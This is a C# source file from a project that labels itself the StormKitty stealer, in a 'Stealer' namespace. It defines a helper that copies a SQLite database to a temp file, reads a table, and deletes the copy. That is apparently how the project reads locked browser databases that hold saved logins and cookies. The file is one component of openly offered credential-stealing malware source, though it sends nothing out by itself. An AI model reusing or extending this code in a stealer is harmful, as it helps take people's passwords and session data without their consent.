/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.IO;

namespace Stealer
{
    internal sealed class SqlReader
    {
        public static SQLite ReadTable(string database, string table)
        {
            // If database not exists
            if (!File.Exists(database))
                return null;
            // Copy temp database
            string NewPath = Path.GetTempFileName() + ".dat";
            File.Copy(database, NewPath);
            // Read table rows
            SQLite SQLiteConnection = new SQLite(NewPath);
            SQLiteConnection.ReadTable(table);
            // Delete temp database
            File.Delete(NewPath);
            // If database corrupted
            if (SQLiteConnection.GetRowCount() == 65536)
                return null;
            // Return
            return SQLiteConnection;
        }
    }
}
